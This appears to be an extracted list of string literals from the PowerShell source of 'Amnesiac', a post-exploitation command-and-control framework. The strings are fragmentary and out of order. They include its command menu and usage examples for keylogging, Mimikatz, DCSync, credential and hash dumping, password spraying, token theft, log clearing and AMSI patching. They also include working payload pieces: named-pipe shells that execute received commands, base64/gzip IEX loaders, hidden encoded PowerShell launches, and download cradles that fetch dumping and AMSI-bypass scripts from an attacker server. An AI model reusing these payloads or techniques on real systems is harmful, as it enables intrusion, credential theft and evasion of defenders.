"""                      Specify your targets - comma separated hostnames"
"""                     Specify your targets - comma separated hostnames"
"""        Specify Credentials and gain a shell as that user"
"""       Specify Credentials and gain a shell as that user"
"""    Access_Check -Method PSRemoting -Command `"
"""    Access_Check -Method PSRemoting -Domain ferrari.local -DomainController DC01.ferrari.local"
"""    Access_Check -Method PSRemoting -Targets `"
"""    Access_Check -Method PSRemoting"
"""    Access_Check -Method SMB -Domain ferrari.local -DomainController DC01.ferrari.local"
"""    Access_Check -Method SMB -Targets `"
"""    Access_Check -Method SMB"
"""    Do not run as local user (e.g.: nt authority\system) unless you specify credentials (WMI only)"
"""    Do not set $computerNameOnly as target if using WMI."
"""    Find-LocalAdminAccess -Method PSRemoting -Command 'whoami' -NoOutput"
"""    Find-LocalAdminAccess -Method PSRemoting -Command 'whoami'"
"""    Find-LocalAdminAccess -Method PSRemoting -Domain ferrari.local -DomainController DC01.ferrari.local"
"""    Find-LocalAdminAccess -Method PSRemoting -InLine"
"""    Find-LocalAdminAccess -Method PSRemoting -Targets `"
"""    Find-LocalAdminAccess -Method PSRemoting -UserName `"
"""    Find-LocalAdminAccess -Method PSRemoting"
"""    Find-LocalAdminAccess -Method SMB -Command 'whoami' -NoOutput"
"""    Find-LocalAdminAccess -Method SMB -Command 'whoami'"
"""    Find-LocalAdminAccess -Method SMB -Domain ferrari.local -DomainController DC01.ferrari.local"
"""    Find-LocalAdminAccess -Method SMB -InLine"
"""    Find-LocalAdminAccess -Method SMB -Targets `"
"""    Find-LocalAdminAccess -Method SMB"
"""    Find-LocalAdminAccess -Method WMI -Command 'whoami' -NoOutput"
"""    Find-LocalAdminAccess -Method WMI -Command 'whoami'"
"""    Find-LocalAdminAccess -Method WMI -Domain ferrari.local -DomainController DC01.ferrari.local"
"""    Find-LocalAdminAccess -Method WMI -InLine"
"""    Find-LocalAdminAccess -Method WMI -Targets `"
"""    Find-LocalAdminAccess -Method WMI -UserName `"
"""    Find-LocalAdminAccess -Method WMI"
"""    Invoke-Command -ComputerName Server01.ferrari.local -ScriptBlock {whoami}"
"""    Invoke-DCSync -Domain domain.local -DomainController DC01.domain.local"
"""    Invoke-DCSync -Hashcat"
"""    Invoke-DCSync"
"""    Invoke-PassSpray                             Spray an empty password across the Domain"
"""    Invoke-PassSpray -Password P@ssw0rd!         Spray a password across the Domain"
"""    Invoke-PassSpray -Password P@ssw0rd! -Domain ferrari.local -DomainController DC01.ferrari.local"
"""    Invoke-SMBRemoting -ComputerName Server01.ferrari.local -Command 'whoami /all'"
"""    Invoke-SessionHunter -CheckAsAdmin -FailSafe"
"""    Invoke-SessionHunter -CheckAsAdmin -UserName 'ferrari\Administrator' -Password 'P@ssw0rd!'"
"""    Invoke-SessionHunter -CheckAsAdmin"
"""    Invoke-SessionHunter -Domain ferrari.local -DomainController DC01.ferrari.local"
"""    Invoke-SessionHunter"
"""    Invoke-WMIRemoting -ComputerName Server01.ferrari.local -Command 'whoami /all' -Username '.\Administrator' -Password 'P@ssw0rd!'"
"""    Invoke-WMIRemoting -ComputerName Server01.ferrari.local -Command 'whoami /all' -Username 'ferrari\Administrator' -Password 'P@ssw0rd!'"
"""    Invoke-WMIRemoting -ComputerName Server01.ferrari.local -Command 'whoami /all'"
"""    SMBRemoting <fqdn> <cmd>      Run command on target as current user using SMBRemoting"
"""    Token-Impersonation -MakeToken -Username `"
"""    Token-Impersonation -Rev2Self"
"""    Token-Impersonation -Steal -ProcessID 5380"
"""    Validate-Credentials -UserName Senna -Domain ferrari.local                          Test Empty Password"
"""    Validate-Credentials -UserName Senna -Password FuerteCorre1                         Test Credentials"
"""    Validate-Credentials -UserName Senna -Password FuerteCorre1 -Domain ferrari.local   Specify Domain"
"""    WMIRemoting <fqdn> <cmd>      Run command on target as current user using WMIRemoting"
"""    shell_psadmin                                  Get a shell on targets where the current user is local admin (PSRemoting)"
"""    shell_psadmin -Domain _ -DomainController _    Specify a target Domain and Domain Controller"
"""    shell_psadmin -Targets `"
"""    shell_psadmin -Username `"
"""    shell_smbadmin                                 Get a shell on targets where the current user is local admin (SMB)"
"""    shell_smbadmin -Domain _ -DomainController _   Specify a target Domain and Domain Controller"
"""    shell_smbadmin -Targets `"
"""    shell_tknadmin                                  Get a shell on targets where the current user is local admin (PSRemoting)"
"""    shell_tknadmin -Domain _ -DomainController _    Specify a target Domain and Domain Controller"
"""    shell_tknadmin -Targets `"
"""    shell_wmiadmin                                 Get a shell on targets where the current user is local admin (WMI)"
"""    shell_wmiadmin -Domain _ -DomainController _   Specify a target Domain and Domain Controller"
"""    shell_wmiadmin -Targets `"
"""    shell_wmiadmin -Username `"
""" "
""" $PwshRawClientScript"
""" $PwshRawServerScript"
""" $UDT"
""" & exit"
""" + "
""" + ($ADCompDomain -replace "
""" -AND $_ -notmatch "
""" -ArgumentList "
""" -Command `"
""" -Domain `"
""" -NoOutput -Targets $userdeftargets -UserName $userdefusername -Password $userdefpassword"
""" -NoOutput -Targets $userdeftargets"
""" -NoOutput -UserName $userdefusername -Password $userdefpassword"
""" -NoOutput"
""" -OR $command -like "
""" -OR $line -like "
""" -Password `"
""" -Read"
""" -WindowStyle Hidden"
""" -and $_ -ne "
""" -f hex'"
""" -or $_ -match "
""" AV                 Check local AV"
""" Admin Sessions:"
""" Ask4Creds          Prompt User for Credentials"
""" AutoMimi           Load Katz and dump"
""" Available Commands:"
""" Available Options:"
""" Bookmarks:"
""" Choose an option or session number, or type 'exit' to quit "
""" Choose an option or type 'exit' to quit "
""" ClearHistory       Clear History for Current User"
""" ClearLogs          Clear Logs from Event Viewer"
""" Clipboard          Get the clipboard (text)"
""" CredMan            CredManager Dump"
""" CredValidate       Validate Domain Credentials"
""" DCSync             Performs DCSync"
""" Download           Download file from remote system [file name]"
""" Dpapi              Retrieve credentials protected by DPAPI"
""" Exit               Background the current session"
""" Find-LocalAdminAccess    Switch between SMB and PSRemoting"
""" GLSet <>           Set Global-Listener Pipe Name"
""" GLSet <string>           Set Global-Listener Pipe Name"
""" GListener          Print Global-Listener Payload"
""" GetSystem          Get a System Shell [New Session]"
""" Global-Listener Sessions:"
""" HashGrab           Attempt to retrieve the Hash of the current user"
""" Help               Help menu"
""" History            Get pwsh history for all users"
""" Hive               HiveDump"
""" Impersonation      Token Impersonation | Make or Steal a Token"
""" Kerb               Kerb TGTs Dump"
""" Keylog             Start Keylogger"
""" KeylogRead         Read Keylog output"
""" Kill               Terminate the current session"
""" LocalAdminAccess   Check Targets for Local Admin Access"
""" Migrate <pid>      Inject payload into specified pid [New Session]"
""" Migrate2 <pid>     Different migration syntax [In case the above fails]"
""" Mimi               Load Katz"
""" Monitor            Monitor Cache for TGTs"
""" MonitorClear       Clear TGTs from Monitor activity"
""" MonitorRead        Retrieve TGTs from Monitor activity"
""" Net                Netstat Command"
""" No bookmark found $desiredIndex"
""" OneIsNone          Get a Backup Shell"
""" PInject            Load ProcessInjection"
""" PassSpray          Domain Password Spray"
""" Patch              Patch 4MZI"
""" PatchNet           Patch 4MZI .NET"
""" PowerView          Load PowerView"
""" Process            Display Running Processes"
""" RDPKeylog          Start RDP Keylogger"
""" RDPKeylogRead      Read RDP Keylog output"
""" Remoting           Remote Command Execution SMB|WMI|WinRM"
""" Removed bookmark $desiredIndex"
""" RepoURL                  Set Repo URL to Default"
""" RepoURL <URL>            Set Repo URL to specified URL"
""" Rubeus             Load Rubeus"
""" Scanning will stop in 40 seconds..."
""" Scramble           Rotate Global-Listener Pipe Name"
""" Screen4K           Take a screenshot [4K]"
""" ScreenShot         Take a screenshot [1080p]"
""" Serve                    Serve scripts from 0.0.0.0:8080"
""" Serve <port> <folder>    Serve scripts from specified folder and port"
""" Services           Display Running Services"
""" SessionHunter      Hunt for Active User Sessions"
""" Sessions           Show active Sessions"
""" Single Listener Sessions:"
""" Software           Display Installed Software"
""" Start-Process powershell.exe -WindowS Hidden -ArgumentList `"
""" Startup            Display Startup Apps"
""" Sync               Re-Sync Stream"
""" TLS                Enable TLS 1.2"
""" Toggle             Switch payload format [default: cmd(b64)]"
""" Upload             Upload file to remote system [full path]"
""" User-Defined Targets:"
""" [$($_.DisplayUserID)]"
""" [$index] $session"
""" [$index] $sessionName"
""" [$index]"
""" [$newIndex] $hostname"
""" [$sessionNumber]"
""" [$sessionuser]"
""" [*] Waiting for connection... [30 seconds timeout]"
""" [+] Admin Access Scan Protocol: SMB"
""" [+] Admin Access Scan Protocol: WMI"
""" [+] Admin Access: $($TempAdminAccessTargets.count) Targets [PSRemoting]"
""" [+] Admin Access: $($TempAdminAccessTargets.count) Targets [SMB]"
""" [+] Admin Access: $($TempAdminAccessTargets.count) Targets [WMI]"
""" [+] Admin Access: $($allTargets.count) Targets [SMB]"
""" [+] Core Commands:"
""" [+] Creating Service on Remote Target..."
""" [+] Domain Actions:"
""" [+] Downloading Scripts to $destinationFolder"
""" [+] File Server started with PID $processId. To kill it [Stop-Process -Id $processId]"
""" [+] Find-LocalAdminAccess Method: PSRemoting"
""" [+] Find-LocalAdminAccess Method: SMB"
""" [+] Global-Listener PipeName: $global:MultiPipeName"
""" [+] Local Actions:"
""" [+] New Global-Listener PipeName: $global:MultiPipeName | Revert: [GLSet $OldGlobalPipeName]"
""" [+] New session established [$($runspace.Computer)]`n"
""" [+] New session established [$computerNameOnly]"
""" [+] Payload format: cmd(b64)"
""" [+] Payload format: cmd(raw)"
""" [+] Payload format: exe"
""" [+] Payload format: gzip"
""" [+] Payload format: pwsh"
""" [+] Payload format: pwsh(raw)"
""" [+] Payload saved to: $exefilelocation"
""" [+] Payload:"
""" [+] Pipe Name: $PipeName"
""" [+] Repo URL set to $global:ServerURL"
""" [+] Scripts Loading:"
""" [+] Service Name: $ServiceName"
""" [+] Session killed [$($selectedMultiSession.ComputerName)]`n"
""" [+] Session killed [$($selectedSession.ComputerName)]`n"
""" [+] System Commands:"
""" [+] Targets Check Completed"
""" [+] Targets Cleared"
""" [+] Targets loaded. Type 'targets' to list/hide them"
""" [+] Targets set. Type 'targets' to list/hide them"
""" [+] User Activity:"
""" [+] Welcome to Amnesiac. Type 'help' to list/hide available commands"
""" [-] Failed to execute"
""" [-] Failed to exit session with PipeName: $($selectedMultiSession.PipeName). Error: $_"
""" [-] Failed to exit session with PipeName: $($selectedSession.PipeName). Error: $_"
""" [-] Invalid command. Type 'help' to list/hide available commands"
""" [-] Invalid selection. Please try again."
""" [-] Invalid session number. Please try again."
""" [-] Killing Admin sessions is not needed, they are not active"
""" [-] No Admin Access [PSRemoting]"
""" [-] No Admin Access [SMB]"
""" [-] No Admin Access [WMI]"
""" [-] No Bookmarks set."
""" [-] No Sessions established."
""" [-] No Targets Defined"
""" [-] No User-Defined Targets. Scope: All"
""" [-] No connection was established"
""" [-] Please specify a Target"
""" [-] Please specify a target"
""" [-] The operation timed out [$computerNameOnly]`n"
""" [0] Scan network for Admin Access"
""" [1] Single-Listener (single target)"
""" [2] Global-Listener (multiple targets)"
""" [3] Scan network for listening targets"
""" [4] Shell via Find-LocalAdminAccess"
""" `$gz=`'$gzipcompressedBase64`';`$a=New-Object IO.MemoryStream(,[Convert]::FROmbAsE64StRiNg(`$gz));`$b=New-Object IO.Compression.GzipStream(`$a,[IO.Compression.CoMPressionMode]::deCOmPreSs);`$c=New-Object System.IO.MemoryStream;`$b.COpYTo(`$c);`$d=[System.Text.Encoding]::UTF8.GETSTrIng(`$c.ToArray());`$b.ClOse();`$a.ClosE();`$c.cLose();`$d|IEX > `$null"
""" bookmark <sess.numb.>    Bookmark selected session"
""" bookmarks                Hide/Display Bookmarks"
""" cmd /c powershell -windows hidden `"
""" cmd /c powershell -windowst hidden `"
""" exit                     Quit Amnesiac"
""" exitfunc=thread -b `"
""" help                     Displays this list of commands"
""" kill <sess.numb.>        Kill selected session"
""" kill all                 Kill all sessions"
""" powershell.exe -NoLogo -NonInteractive -ep bypass -WindowS Hidden -enc $b64ClientScript & exit"
""" powershell.exe -NoLogo -NonInteractive -ep bypass -WindowS Hidden -enc $b64ServerScript & exit"
""" powershell.exe -ep bypass -Window Hidden -c `"
""" scramble                 Rotate Global-Listener Pipe Name"
""" sessions                 Hide/Display Active Sessions"
""" switch                   Switch between SMB and WMI for Admin Access Scan"
""" targets                  Hide/Display User-Defined Targets"
""" targets <Path or tgrts>  Path or `"
""" targets check            Check for and list only alive targets"
""" targets clear            Clear all User-Defined Targets"
""" toggle                   Switch payload format (default: b64)"
""" unbookmark <sess.numb.>  Remove a bookmark"
""" | ForEach-Object { ($_ -split "
""" | Out-String -Width 4096"
""" | Select-Object -First 1 } | Where-Object { $_ -ne "
""" | Set-WmiInstance -Arguments `@{OutputData = `$outputData; CommandStatus='Completed'} | Out-Null"
""" } else { "
""" } | Sort-Object -Unique | ForEach-Object { try { "
""" })"
""" };Get-Item -Path "
""" };Get-Process | Where-Object { $_.Name -like "
""""" | % {`$sw.WriteLine(`$_)}};`$sw.WriteLine("
""""" | % {`$sw.WriteLine(`$_.TrimEnd())}}catch{`$err=`$_.Exception.Message;`$err-split"
"""""#END#"
"""""$ComputerName"
"""""$PipeName"
"""""$SID"
""""");`$sD.AddAccessRule(`$aR);`$pS=New-Object System.IO.Pipes.NamedPipeServerStream('$PN','InOut',1,'Byte','None',1028,1028,`$sD);`$tcb={param(`$state);`$state.Close()};`$tm = New-Object System.Threading.Timer(`$tcb, `$ps, 600000, [System.Threading.Timeout]::Infinite);`$ps.WaitForConnection();`$tm.Change([System.Threading.Timeout]::Infinite, [System.Threading.Timeout]::Infinite);`$tm.Dispose();`$sr=New-Object System.IO.StreamReader(`$pS);`$sw=New-Object System.IO.StreamWriter(`$pS);while(`$true){if(-not `$pS.IsConnected){break};`$cmd=`$sr.ReadLine();if(`$cmd-eq"
""""");`$sw.Flush()}};`$pS.Disconnect();`$pS.Dispose()"
""""");`$w.Flush();while(`$true){`$c=`$r.ReadLine();if(`$c-eq "
""""");`$w.Flush();while(`$true){`$c=`$r.ReadLine();if(`$c-eq 'exit'){break};try{`$result=iex "
""""");`$w.Flush()}`$p.Close();`$p.Dispose()"
"""""){break};try{`$result=iex "
"""""){break}else{try{`$res=iex "
""""", "
""""","
""""",'InOut');`$r=New-Object System.IO.StreamReader(`$p);`$w=New-Object System.IO.StreamWriter(`$p);`$p.Connect(600000);`$w.WriteLine("
""""";$TempNet | Select-String -Pattern "
""""";Write-Output "
""""";`$aR=New-Object System.IO.Pipes.PipeAccessRule(`$sU,"
""""";`$res -split "
""""";`$result-split "
""""";`$result-split '`n'|%{`$w.WriteLine(`$_.TrimEnd())}}catch{`$_.Exception.Message-split '`r?`n'|%{`$w.WriteLine(`$_)}};`$w.WriteLine('#END#');`$w.Flush()}`$p.Close();`$p.Dispose()"
"""""Allow"
"""""FullControl"
"""""S-1-1-0"
"""""`$([System.Net.Dns]::GetHostByName((`$env:computerName)).HostName),`$(Get-Location),`$(whoami)"
"""""`$c 2>&1 | Out-String"
"""""`$cmd 2>&1 | Out-String"
"""""`u{000A}"
"""""`u{000D}`u{000A}"
"""""exit"
"""""|ForEach-Object{`$w.WriteLine(`$_)}};`$w.WriteLine("
"""""|ForEach-Object{`$w.WriteLine(`$_.TrimEnd())}}catch{`$_.Exception.Message-split "
"""###END###"
"""#Amn3siacP@ssw0rd!#`"
"""#END#"
"""#END#`"
"""$($Result.ComputerName): Error - $($Result.Error)"
"""$($Result.Output.TrimEnd())"
"""$($_.ToString("
"""$($global:ServerURL)/Ask4Creds.ps1"
"""$($global:ServerURL)/Ferrari.ps1"
"""$($global:ServerURL)/Find-LocalAdminAccess.ps1"
"""$($global:ServerURL)/HiveDump.ps1"
"""$($global:ServerURL)/Invoke-GrabTheHash.ps1"
"""$($global:ServerURL)/Invoke-Patamenia.ps1"
"""$($global:ServerURL)/Invoke-SMBRemoting.ps1"
"""$($global:ServerURL)/Invoke-SessionHunter.ps1"
"""$($global:ServerURL)/Invoke-WMIRemoting.ps1"
"""$($global:ServerURL)/NETAMSI.ps1"
"""$($global:ServerURL)/PInject.ps1"
"""$($global:ServerURL)/RDPKeylog.exe"
"""$($global:ServerURL)/SimpleAMSI.ps1"
"""$($global:ServerURL)/Suntour.ps1"
"""$($global:ServerURL)/TGT_Monitor.ps1"
"""$($global:ServerURL)/Tkn_Access_Check.ps1"
"""$($global:ServerURL)/Token-Impersonation.ps1"
"""$($global:ServerURL)/cms.ps1"
"""$($global:ServerURL)/dumper.ps1"
"""$($global:ServerURL)/klg.ps1"
"""$($global:ServerURL)/pwv.ps1"
"""$($shellcode | foreach-object { "
"""$Command 2>&1 | Out-String"
"""$Command`"
"""$Computer"
"""$ComputerName"
"""$FinalCommand"
"""$GlobalPipeName"
"""$HostFQDN"
"""$IP"
"""$InjectCommand"
"""$KeyID = '$GuidOutput'"
"""$KeyID = '$GuidOutput'`"
"""$PN"
"""$PipeName"
"""$RawClientScript`"
"""$RawServerScript`"
"""$SID"
"""$SID`"
"""$ServiceName"
"""$ShCodePlaceholder`"
"""$SyncString"
"""$Target"
"""$Target`"
"""$TempHostname"
"""$_ - "
"""$_"
"""$arguments`"
"""$baseFileNameWithoutExtension($counter)$fileExtension"
"""$cmd"
"""$fileName"
"""$finalstring"
"""$finalstring`"
"""$line"
"""$line`n"
"""$pipeName`"
"""$predefinedCommands"
"""$rawCommand"
"""$script"
"""$startarguments`"
"""$userCommand 2>&1 | Out-String"
"""'"
"""'''"
"""', "
"""($counter)"
"""(&(sAMAccountType=805306369)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"
"""(objectClass=trustedDomain)"
""") -OR ($command -like "
""") url = "
"""))"
"""); `$sw.Flush(); `$dummyPipeClient.Close()"
""");`$sd.AddAccessRule(`$ar);`$ps=New-Object System.IO.Pipes.NamedPipeServerStream('$PN','InOut',1,'Byte','None',1028,1028,`$sd);`$tcb={param(`$state);`$state.Close()};`$tm = New-Object System.Threading.Timer(`$tcb, `$ps, 600000, [System.Threading.Timeout]::Infinite);`$ps.WaitForConnection();`$tm.Change([System.Threading.Timeout]::Infinite, [System.Threading.Timeout]::Infinite);`$tm.Dispose();`$sr=New-Object System.IO.StreamReader(`$ps);`$sw=New-Object System.IO.StreamWriter(`$ps);while(`$true){Start-Sleep -Milliseconds 100;if(-not `$ps.IsConnected){break};`$c=`$sr.ReadLine();if(`$c-eq`"
""");`$sd.AddAccessRule(`$ar);`$ps=New-Object System.IO.Pipes.NamedPipeServerStream('$PN','InOut',1,'Byte','None',1028,1028,`$sd);`$tcb={param(`$state);`$state.Close()};`$tm = New-Object System.Threading.Timer(`$tcb, `$ps, 600000, [System.Threading.Timeout]::Infinite);`$ps.WaitForConnection();`$tm.Change([System.Threading.Timeout]::Infinite, [System.Threading.Timeout]::Infinite);`$tm.Dispose();`$sr=New-Object System.IO.StreamReader(`$ps);`$sw=New-Object System.IO.StreamWriter(`$ps);while(`$true){if(-not `$ps.IsConnected){break};`$c=`$sr.ReadLine();if(`$c-eq`"
""");`$sw.Flush()}};`$ps.Disconnect();`$ps.Dispose()"
""");`$sw.Flush()}};`$ps.Disconnect();`$ps.Dispose();exit"
""")[3] -split "
"""){$finalstring = "
"""){break}else{try{`$r=iex `"
"""*$desiredIndex*"
"""*Empty Registry*"
"""*Failed to write*"
"""*antivirus*"
"""*not running*"
""", "
""", 'InOut'); `$dummyPipeClient.Connect(); `$sw = New-Object System.IO.StreamWriter(`$dummyPipeClient); `$sw.WriteLine(`"
""", `"
""","
""",DC="
""",`"
"""-Domain"
"""-DomainController"
"""-NoLogo -NonInteractive -ep bypass -WindowS Hidden -enc $b64psScript"
"""-NoP`"
"""-NoProfile"
"""-Password"
"""-Targets"
"""-UserName"
"""-WindowS Hidden -ep Bypass -enc $b64FileServerMonitoringScript"
"""-WindowS Hidden -ep Bypass -enc $b64monitoringScript"
"""-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -enc $b64monitoringScript"
"""-enc $b64ServerScriptEdit`"
"""-enc $b64ServerScript`"
"""-enc $encodedCommand"
"""-ep Bypass"
"""-ep Bypass`"
"""-ep bypass -WindowS Hidden -enc $b64psScript"
""".\Administrator`"
""".`"
""".png"
""".txt"
"""/"
"""/index.html"
"""/platform:x64 /target:exe"
"""0.0.0.0"
"""10."
"""127.0.0.1"
"""192.168."
"""30000"
""":"
"""; Write-Output "
""";Get-Process -IncludeUserName | Select ID, ProcessName, SessionId, UserName, Path | Sort ProcessName | ft -Autosize | Out-String -Width 4096;Write-Output "
""";Get-Process -IncludeUserName | Select ID, ProcessName, SessionId, UserName, Path | Sort UserName,ProcessName | ft -Autosize | Out-String -Width 4096;if($Isx64){Write-Output "
""";Get-Process | Select ID, ProcessName, SessionId, Path | Sort ID | ft -Autosize | Out-String -Width 4096;if($Isx64){Write-Output "
""";Write-Output "
""";`$ar=New-Object System.IO.Pipes.PipeAccessRule(`$user,`"
""";`$r-split`"
""";exit"
"""AV"
"""Access_Check*"
"""Administrator`"
"""Allow"
"""Allow`"
"""An error occurred: $_"
"""AutoMimi"
"""AutoMimi*"
"""C:\Users"
"""C:\Users\"
"""C:\Users\$env:USERNAME\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
"""C:\Users\Public\Documents\Amnesiac"
"""C:\Users\Public\Documents\Amnesiac\Payloads\$($PipeName).exe"
"""C:\Users\Public\Documents\Amnesiac\Payloads\$($global:MultiPipeName).exe"
"""C:\Windows\System32\cmd.exe /c powershell.exe -enc $B64ServerScript`"
"""C:\Windows\System32\cmd.exe /c powershell.exe -enc $b64ClientScript`"
"""C:\Windows\System32\cmd.exe /c powershell.exe -enc $b64ServerScript`"
"""ClearHistory"
"""ClearLogs"
"""Clipboard"
"""CmdGUID"
"""Command execution completed"
"""CommandStatus"
"""Completed"
"""Connection: close"
"""Content-Length: "
"""CredMan"
"""Custom_WMI_"
"""DC01.ferrari.local,Server2012.ferrari.local`"
"""DC="
"""DCSync"
"""Download *"
"""Downloads"
"""Dpapi"
"""Error downloading '$url': $_"
"""Failed to run command on $ComputerName."
"""Failed to start process on $ComputerName. Return value: $($startProcess.ReturnValue)"
"""Find-LocalAdminAccess -Method SMB -Command `"
"""Find-LocalAdminAccess -Method SMB -Domain $userdefdomain -Command `"
"""Find-LocalAdminAccess -Method SMB -Domain $userdefdomain -DomainController $userdefdc -Command `"
"""Find-LocalAdminAccess -Method WMI -Command `"
"""Find-LocalAdminAccess -Method WMI -Domain $userdefdomain -Command `"
"""Find-LocalAdminAccess -Method WMI -Domain $userdefdomain -DomainController $userdefdc -Command `"
"""Find-LocalAdminAccess*"
"""FullControl"
"""FullControl`"
"""GET"
"""Get-Clipboard"
"""GetSystem"
"""HKLM:\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths"
"""HTTP/1.1 200 OK"
"""HTTP/1.1 404 Not Found"
"""HashGrab"
"""History"
"""Hive"
"""Invoke-PassSpray*"
"""Invoke-SMBRemoting -ComputerName `"
"""Invoke-SessionHunter*"
"""Invoke-WMIRemoting -ComputerName `"
"""Invoke-WebRequest -Uri '$($global:ServerURL)/RDPKeylog.exe' -OutFile 'C:\Users\Public\Documents\RDPLog.exe';`$process = Start-Process -FilePath 'C:\Users\Public\Documents\RDPLog.exe' -PassThru;`$processId = `$process.Id"
"""Kerb"
"""Key"
"""Keylog"
"""KeylogRead"
"""Keylogger"
"""LDAP://$Server/DC=$($Domain -replace '\.',',DC=')"
"""LDAP://$domainDN"
"""LDAP://DC=$($Domain -replace '\.',',DC=')"
"""Listening on "
"""LocalAdminAccess"
"""Migrate *"
"""Migrate2 *"
"""Mimi"
"""Mimi*"
"""Monitor"
"""MonitorClear"
"""MonitorRead"
"""Monitor_TGTs"
"""Net"
"""No Access"
"""NotStarted"
"""OneIsNone"
"""OutputData"
"""P@ssw0rd!`"
"""PInject *"
"""PInject /t:1 /f:hex /pid:$InjectPID /sc:$InjectHex /enc:AES"
"""PInject"
"""PSRemoting"
"""Patch"
"""PatchNet"
"""Payloads"
"""Please use Method WMI or PSRemoting if you need to run as a different user"
"""PowerView"
"""Process"
"""RDPKeylog"
"""RDPKeylogRead"
"""ROOT\CIMV2"
"""Remoting"
"""RepoURL*"
"""Rubeus"
"""Running"
"""S-1-1-0"
"""S-1-1-0`"
"""SMB"
"""SMBRemoting *"
"""Screenshots"
"""Scripts"
"""Serve*"
"""Service_"
"""Services"
"""SessionHunter"
"""Sessions"
"""ShellGen *"
"""ShellGen"
"""SilentlyContinue"
"""Software"
"""Start-Process powershell.exe -WindowS Hidden -ArgumentList `"
"""Start-Process sc.exe -ArgumentList `"
"""Start-Sleep -Milliseconds 1000"
"""Start-Sleep -Milliseconds 2000"
"""Start-Sleep -Seconds 10;sc.exe delete $serviceToDelete;Stop-Process -Id `$pid -Force"
"""Start-Sleep -Seconds 30; `$dummyPipeClient = New-Object System.IO.Pipes.NamedPipeClientStream(`"
"""Startup"
"""System.Core.dll"
"""System.Management.Automation.dll"
"""System.dll"
"""TGTDump"
"""TLS"
"""The current user has"
"""Upload *"
"""WMI"
"""WMIRemoting *"
"""Workstation-01.ferrari.local,DC01.ferrari.local`"
"""Write-Output $PN"
"""Write-Output $SyncString"
"""Write-Output '';Write-Output '[+] DpapiDump Loaded | https://github.com/tmenochet/PowerDump';iex(new-object net.webclient).downloadstring('$($global:ServerURL)/Dpapi.ps1');Invoke-DpapiDump"
"""Write-Output '';Write-Output '[+] HiveDump Loaded | https://github.com/tmenochet/PowerDump';Write-Output '';iex(new-object net.webclient).downloadstring('$($global:ServerURL)/HiveDump.ps1');Invoke-HiveDump"
"""Write-Output '';Write-Output '[+] Invoke-GrabTheHash Loaded | https://github.com/Leo4j/Invoke-GrabTheHash';Write-Output '';New-Item 'tmpfile' -EA 0 > `$null; if(`$?){del 'tmpfile';iex(new-object net.webclient).downloadstring('$($global:ServerURL)/SimpleAMSI.ps1');iex(new-object net.webclient).downloadstring('$($global:ServerURL)/NETAMSI.ps1');iex(new-object net.webclient).downloadstring('$($global:ServerURL)/Ferrari.ps1');iex(new-object net.webclient).downloadstring('$($global:ServerURL)/Invoke-GrabTheHash.ps1');`$HashGrab = Invoke-GrabTheHash | Where-Object{`$_ -match 'NTLM hash'};if(`$HashGrab){`$HashGrab}else{Write-Output '[-] HashGrab Failure'}}else{Write-Output '[-] Please move to a writable directory'}#"
"""Write-Output '';Write-Output '[+] PowershellKerberos Loaded | https://github.com/MzHmO/PowershellKerberos';Write-Output '';iex(new-object net.webclient).downloadstring('$($global:ServerURL)/dumper.ps1')"
"""X2"
"""[$($ComputerName)]: An unexpected error occurred"
"""[$($ComputerName)]: Connection timed out"
"""[$($Target)]: An unexpected error occurred"
"""[$($Target)]: Connection timed out"
"""[$ComputerName]: PS:\>"
"""[$PromptComputerName]: $remotePath "
"""[$computerNameOnly]: $remotePath "
"""[*] Available IP addresses:"
"""[*] Important:"
"""[+] $($Result.ComputerName)"
"""[+] $UserName has Local Admin access on:"
"""[+] Ask4Creds Loaded | Timeout: 25sec"
"""[+] Check Access:"
"""[+] Clipboard saved to $fileName"
"""[+] Command execution completed"
"""[+] Current Process [x64]:"
"""[+] Current Process [x86]:"
"""[+] Domain Password Spray | https://github.com/Leo4j/PassSpray"
"""[+] File downloaded to $fileName"
"""[+] File uploaded"
"""[+] Find-LocalAdminAccess Loaded | https://github.com/Leo4j/Find-LocalAdminAccess"
"""[+] Get a Shell:"
"""[+] History Cleared"
"""[+] History File Saved to: $fileName"
"""[+] Invoke-DCSync Loaded | https://github.com/vletoux/MakeMeEnterpriseAdmin"
"""[+] Invoke-SessionHunter Loaded | https://github.com/Leo4j/Invoke-SessionHunter"
"""[+] Keylog saved to $fileName"
"""[+] Keylogger started with PID $($processId.Trim()). To kill it [Stop-Process -Id $($processId.Trim())]"
"""[+] Logs Cleared"
"""[+] New session established [$computerNameOnly]"
"""[+] Output saved to $fileName"
"""[+] Output saved to: $PWD\LocalAdminAccess.txt"
"""[+] Output saved to: c:\Users\Public\Documents\LocalAdminAccess.txt"
"""[+] Processes sorted by PID:"
"""[+] Processes sorted by ProcessName:"
"""[+] Processes sorted by Username:"
"""[+] RDP Keylog saved to $fileName"
"""[+] RDP Keylogger Loaded | Saving to c:\Users\Public\Documents | https://github.com/nocerainfosec/TakeMyRDP2.0"
"""[+] RDP Keylogger started with PID $($processId.Trim()). To kill it [Stop-Process -Id $($processId.Trim())]"
"""[+] Resolving Foreign Addresses"
"""[+] Resynchronized with stream."
"""[+] SMBRemoting and WMIRemoting Loaded | https://github.com/Leo4j/Invoke-SMBRemoting | https://github.com/Leo4j/Invoke-WMIRemoting"
"""[+] Screenshot location: $fileName"
"""[+] Shellcode (hex):"
"""[+] Shortcuts:"
"""[+] TGT_Monitor started with PID $($processId.Trim()). To kill it [Stop-Process -Id $($processId.Trim())]"
"""[+] TLS Enabled"
"""[+] The current user has Local Admin access on:"
"""[+] Token-Impersonation Loaded | https://github.com/Leo4j/Token-Impersonation"
"""[+] Usage:"
"""[+] Validate Domain Credentials | https://github.com/Leo4j/Validate-Credentials"
"""[-] Access Denied"
"""[-] Empty Clipboard"
"""[-] Empty Keylog"
"""[-] Empty RDP Keylog"
"""[-] Error retrieving History for user $userDir"
"""[-] Error retrieving screenshot"
"""[-] Failed on $($result.Computer): $($result.Message)"
"""[-] Injection Failed. Did you load the module ? [PInject]"
"""[-] No Access"
"""[-] No connection was established. Returning to previous menu..."
"""[-] Please provide your host IP address: -IP <YOUR-IP>"
"""[-] The file specified does not exist."
"""[Convert]::ToBase64String([System.IO.File]::ReadAllBytes('$historyFile'))"
"""[Convert]::ToBase64String([System.IO.File]::ReadAllBytes(`"
"""[IO.File]::WriteAllBytes('$UserPath\$remoteFileName', [Convert]::FromBase64String('$fileContentBase64'))"
"""[{0}]"
"""\."
"""\\"
